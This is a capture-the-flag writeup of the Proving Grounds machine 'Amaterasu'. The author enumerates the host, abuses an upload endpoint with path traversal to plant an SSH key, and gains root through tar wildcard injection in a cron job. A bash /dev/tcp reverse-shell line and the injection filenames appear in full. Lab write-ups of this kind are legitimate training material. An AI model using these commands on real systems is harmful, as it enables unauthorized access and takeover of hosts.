---
title: CTF Writeup - PG Amaterasu
date: 2024-01-01
author: kei5uke
description: Writeup for PG Amaterasu
tags:
  - linux
  - writeup
---

# Amaterasu

# Enumeration

## Nmap

```powershell
# Nmap 7.94 scan initiated Mon Jan  1 18:16:02 2024 as: nmap -sV -sC -T4 -p- -oN nmap.txt 192.168.162.249
Nmap scan report for 192.168.162.249
Host is up (0.046s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   unknown
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Mon, 01 Jan 2024 16:17:53 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)
|_http-title: My test page
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33414-TCP:V=7.94%I=7%D=1/1%Time=6592E5B1%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werk
SF:zeug/2\.2\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2001\x20Jan\x202024\x
SF:2016:17:53\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCo
SF:ntent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\
SF:n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Foun
SF:d</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\
SF:x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please
SF:\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(HTTPOp
SF:tions,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.2
SF:\.3\x20Python/3\.9\.13\r\nDate:\x20Mon,\x2001\x20Jan\x202024\x2016:17:5
SF:3\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x2
SF:0lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<
SF:p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server
SF:\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check
SF:\x20your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(RTSPRequest,1F4
SF:,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.
SF:dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=ut
SF:f-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title
SF:>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Mess
SF:age:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BA
SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
SF:od\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Help,1EF,"<!DOCTYPE\x2
SF:0HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>
SF:\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http
SF:-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x2
SF:0\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20
SF:code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x2
SF:0request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Ba
SF:d\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x
SF:20\x20</body>\n</html>\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  1 18:19:47 2024 -- 1 IP address (1 host up) scanned in 224.29 seconds
```

## Web Page

![Screenshot 2024-01-01 at 19.54.05.png](Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_19.54.05.png)

## Gobuster on 40080

```powershell
┌──(root💀kali)-[~/amaterasu2]
└─# gobuster dir -u http://192.168.162.249:40080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.249:40080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/01 19:04:35 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 244] [--> http://192.168.162.249:40080/images/]
/styles               (Status: 301) [Size: 244] [--> http://192.168.162.249:40080/styles/]
/LICENSE              (Status: 200) [Size: 6555]
Progress: 87644 / 87665 (99.98%)
===============================================================
2024/01/01 19:11:47 Finished
===============================================================
```

Nothing interesting here.

## Gobuster on 33414

```powershell
──(root💀kali)-[~/amaterasu2]
└─# gobuster dir -u http://192.168.162.249:33414/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.249:33414/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/01 19:18:16 Starting gobuster in directory enumeration mode
===============================================================
/help                 (Status: 200) [Size: 137]
/info                 (Status: 200) [Size: 98]
Progress: 41296 / 87665 (47.11%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2024/01/01 19:25:01 Finished
===============================================================
```

Found some API features here.

## Enumerating API endpoint

```powershell
┌──(root💀kali)-[~/amaterasu2]
└─# curl -X GET http://192.168.162.249:33414/help | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   137  100   137    0     0   1475      0 --:--:-- --:--:-- --:--:--  1489
[
  "GET /info : General Info",
  "GET /help : This listing",
  "GET /file-list?dir=/tmp : List of the files",
  "POST /file-upload : Upload files"
]
```

```powershell
┌──(root💀kali)-[~/amaterasu2]
└─# curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   563  100   563    0     0    625      0 --:--:-- --:--:-- --:--:--   624
[
  "flask.tar.gz",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo"
]
```

The API provides a file upload feature.

```powershell
┌──(root💀kali)-[~/amaterasu2]
└─# curl -X POST http://192.168.162.249:33414/file-upload -F file=@./rev.php.txt -F filename='rev.php'
{"message":"File successfully uploaded"}
                                                                                         
┌──(root💀kali)-[~/amaterasu2]
└─# curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp | jq .      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   573  100   573    0     0   6178      0 --:--:-- --:--:-- --:--:--  6228
[
  "rev.php",
  "flask.tar.gz",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-httpd.service-Nae0ZJ",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-logind.service-FKAUil",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-ModemManager.service-vpkdWb",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-chronyd.service-4zOGIi",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-dbus-broker.service-DeFCB5",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-resolved.service-pDGRUI",
  "systemd-private-2e0fe856c0fd44ecadc327be091b8089-systemd-oomd.service-dJ9LLo"
]

┌──(root💀kali)-[~/amaterasu2]
└─# curl -X GET http://192.168.162.249:33414/file-list?dir=/tmp/rev.php       
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Uploaded and executed php reverse shell, but it did not work.

# First Shell

```powershell
┌──(root💀kali)-[~/amaterasu2]
└─# curl -X POST http://192.168.162.249:33414/file-upload -F file=@./id_rsa.pub.txt -F filename='../home/alfredo/.ssh/authorized_keys'
{"message":"File successfully uploaded"}
                                                                                         
┌──(root💀kali)-[~/amaterasu2]
└─# ssh alfredo@192.168.162.249 -p 25022 -i ./id_rsa
Last failed login: Mon Jan  1 13:16:13 EST 2024 from 192.168.45.169 on ssh:notty
There was 1 failed login attempt since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ whoami
alfredo
```

Generated ssh key and uploaded it as authorized_keys in some home user folder and got ssh connection.

# Privilege Escalation

```powershell
*/1 * * * * root /usr/local/bin/backup-flask.sh
```

```powershell
[alfredo@fedora restapi]$ cat /usr/local/bin/backup-flask.sh 
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

After running linPEAS.sh, I found cron job running every minute, execute some script as root user.

This tar command with wild card can be exploited.

[Privilege Escalation Using Wildcard Injection | Tar Wildcard Injection |](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)

```powershell
[alfredo@fedora restapi]$ cat rev.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.169/443 0>&1
```

Put reverse shell script in the `restapi` directory

```powershell
[alfredo@fedora restapi]$ echo "" > '--checkpoint-action=exec=sh rev.sh'
[alfredo@fedora restapi]$ echo "" > "--checkpoint=1"
```

Ran the commands above. These commands are registered as `tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1` when cronjob is executed.

# Root shell

![Screenshot 2024-01-01 at 21.01.02.png](Amaterasu%208a737b17570c4996b62a570a406df97f/Screenshot_2024-01-01_at_21.01.02.png)

Waited for 1 minute, and got root shell.